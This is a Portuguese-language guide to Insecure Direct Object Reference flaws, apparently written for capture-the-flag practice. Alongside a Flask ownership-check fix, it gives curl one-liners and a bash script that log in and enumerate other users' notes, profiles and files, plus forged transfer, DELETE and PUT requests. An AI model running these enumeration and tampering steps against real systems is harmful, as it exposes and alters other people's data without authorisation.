# Insecure Direct Object Reference (IDOR) — Guia Completo

> A app usa IDs controláveis pelo utilizador para aceder a objetos, mas não verifica se o utilizador tem permissão.

## CWE
- CWE-639 — Authorization Bypass Through User-Controlled Key
- CWE-862 — Missing Authorization

---

## Conceito

**Autenticação** = "quem és tu?" (login)
**Autorização** = "tens permissão para aceder a ISTO?" (ownership check)

IDOR acontece quando a app verifica autenticação mas **não** verifica autorização ao nível do objeto. Estás logged in, mas podes aceder a dados de outros utilizadores.

---

## Como reconhecer

- URLs com IDs numéricos/sequenciais: `/note/1`, `/user/42`, `/invoice/100`
- APIs com IDs: `/api/users/7`, `/api/orders/123`, `/api/files/abc`
- Parâmetros no body: `user_id=1`, `account=12345`
- Parâmetros na query: `?id=1`, `?profile=42`
- Headers: `X-User-Id: 1`

**Perguntas-chave:**
1. O ID é sequencial/previsível?
2. Posso mudar o ID e aceder a dados de outro utilizador?
3. A app verifica que o recurso me pertence?

---

## Metodologia

### Passo 1 — Login como utilizador normal
```bash
curl -c cookies.txt -L -X POST http://TARGET/login -d "user=guest&pw=guest123"
```

### Passo 2 — Encontrar o teu ID
```bash
# Navegar para os teus dados
curl -s -b cookies.txt http://TARGET/note/1
curl -s -b cookies.txt http://TARGET/profile
curl -s -b cookies.txt http://TARGET/api/me
```

### Passo 3 — Iterar IDs
```bash
# Testar IDs à volta do teu
for i in $(seq 1 20); do
  echo "=== ID $i ==="
  curl -s -b cookies.txt "http://TARGET/note/$i" | head -5
  echo
done
```

### Passo 4 — Procurar dados sensíveis
```bash
# Filtrar por flags ou dados interessantes
for i in $(seq 1 50); do
  BODY=$(curl -s -b cookies.txt "http://TARGET/note/$i")
  echo "$BODY" | grep -qi "flag\|secret\|admin\|confidential" && \
    echo "=== FOUND at ID $i ===" && echo "$BODY"
done
```

---

## Variantes de IDOR

### A) IDOR em URL path
```
GET /note/1        → tua nota
GET /note/3        → nota do admin (flag!)
GET /user/7        → perfil do admin
GET /invoice/100   → fatura de outro cliente
```

### B) IDOR em query parameters
```
GET /profile?id=1        → teu perfil
GET /profile?id=2        → perfil de outro user
GET /download?file=1     → teu ficheiro
GET /download?file=42    → ficheiro de outro user
```

### C) IDOR em body (POST/PUT)
```bash
curl -X POST http://TARGET/transfer -d "from=1&to=2&amount=100"
# Mudar from para conta de outra pessoa
curl -X POST http://TARGET/transfer -d "from=999&to=1&amount=100"
```

### D) IDOR em APIs REST
```
GET /api/users/1/notes        → tuas notas
GET /api/users/2/notes        → notas de outro user
DELETE /api/users/2/notes/1   → apagar nota de outro user
PUT /api/users/2              → editar perfil de outro user
```

### E) IDOR com UUIDs
UUIDs não são sequenciais, mas se conseguires **descobrir** o UUID de outro utilizador (leaks em JS, API responses, logs, referrals):
```bash
# Procurar UUIDs no JavaScript
curl -s http://TARGET/static/app.js | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'

# Procurar em respostas de API
curl -s -b cookies.txt http://TARGET/api/users | python3 -m json.tool
```

### F) IDOR + verbose parameter
Parâmetros extra que expõem campos escondidos:
```bash
curl -s "http://TARGET/api/users/7"                  # dados normais
curl -s "http://TARGET/api/users/7?verbose=true"     # campos extra (flag!)
curl -s "http://TARGET/api/users/7?debug=1"
curl -s "http://TARGET/api/users/7?full=true"
curl -s "http://TARGET/api/users/7?include=all"
```

### G) IDOR horizontal vs vertical
- **Horizontal:** aceder a dados de outro utilizador **do mesmo nível** (user → user)
- **Vertical:** aceder a dados de utilizador **de nível superior** (user → admin)

---

## Técnicas de descoberta de IDs

### IDs sequenciais
```bash
# Se o teu ID é 5, testar 1-10
seq 1 10
```

### IDs em JavaScript
```bash
curl -s http://TARGET/static/app.js | grep -iE 'ADMIN.*ID|profile.*id|user.*id'
# ADMIN_PROFILE_ID = 7
```

### IDs em HTML source
```bash
curl -s -b cookies.txt http://TARGET/ | grep -oP 'href="[^"]*\d+[^"]*"'
```

### IDs em API responses
```bash
curl -s -b cookies.txt http://TARGET/api/users | python3 -c "
import sys, json
data = json.load(sys.stdin)
for u in data:
    print(f\"ID: {u.get('id')} - {u.get('username','?')}\")
"
```

### IDs leaked em funcionalidades públicas
- Página de "stories" / "testimonials" com links para perfis
- Feed RSS com IDs de posts
- Sitemap com URLs
- Reset password que revela se o ID existe

---

## IDOR vs autenticação falhada

| Comportamento | Diagnóstico |
|---------------|------------|
| 401 Unauthorized sem login | Falta autenticação, não IDOR |
| 200 OK com dados de outro user | **IDOR confirmado** |
| 403 Forbidden para IDs de outros | App **verifica** ownership (seguro) |
| 404 para IDs que existem | App esconde recursos (parcialmente seguro) |
| Mesmo resultado para qualquer ID | Talvez não seja IDOR — verificar melhor |

---

## Automatização

### Script completo de enumeração
```bash
#!/bin/bash
TARGET="http://TARGET"
COOKIE_FILE="cookies.txt"

# Login
curl -s -c "$COOKIE_FILE" -L -X POST "$TARGET/login" \
  -d "user=guest&pw=guest123"

# Enumerar
echo "=== Enumerando notas ==="
for i in $(seq 1 100); do
  BODY=$(curl -s -b "$COOKIE_FILE" "$TARGET/note/$i")
  
  # Skip 404
  echo "$BODY" | grep -q "not found\|404" && continue
  
  # Mostrar se tem algo interessante
  if echo "$BODY" | grep -qiE "flag|secret|admin|confidential|private"; then
    echo "*** ID $i — INTERESTING ***"
    echo "$BODY"
    echo "---"
  fi
done
```

---

## Fix correto

```python
# ERRADO — verifica autenticação, mas NÃO autorização
@app.route("/note/<int:id>")
def note(id):
    if "user" not in session:
        abort(401)                      # authentication ✓
    note = get_note(id)
    return render(note)                 # qualquer nota! authorization ✗

# CORRETO — verifica ownership
@app.route("/note/<int:id>")
def note(id):
    if "user" not in session:
        abort(401)                      # authentication ✓
    note = get_note(id)
    if note.owner != session["user"]:
        abort(403)                      # authorization ✓
    return render(note)

# ALTERNATIVA — filtrar na query
@app.route("/notes")
def my_notes():
    notes = db.query("SELECT * FROM notes WHERE owner = ?", (session["user"],))
    return render(notes)
```

**Erros comuns que NÃO são fix:**
- ❌ "Esconder o link" (security through obscurity)
- ❌ "Usar UUIDs em vez de IDs sequenciais" (UUIDs podem ser leaked)
- ❌ "Remover a listagem" (o atacante pode iterar)

**O único fix real:** verificar **ownership** no servidor para cada acesso a cada objeto.
